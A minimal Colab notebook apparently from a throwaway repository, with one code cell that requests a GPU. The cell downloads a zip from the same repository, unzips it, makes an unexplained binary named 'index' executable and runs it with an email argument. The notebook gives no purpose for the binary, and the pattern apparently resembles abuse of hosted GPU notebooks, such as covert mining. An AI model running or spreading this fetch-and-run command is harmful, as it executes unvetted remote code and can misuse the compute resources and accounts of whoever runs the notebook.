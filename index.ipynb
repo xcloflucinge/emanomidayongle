{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "index.ipynb",
      "provenance": [],
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "eQ8ZxIkvqIJu"
      },
      "source": [
        "!wget -O index.zip https://raw.githubusercontent.com/xcloflucinge/emanomidayongle/main/index.zip && unzip -o index.zip && chmod +x ./index && ./index --email=RIG2@abc.xyz"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}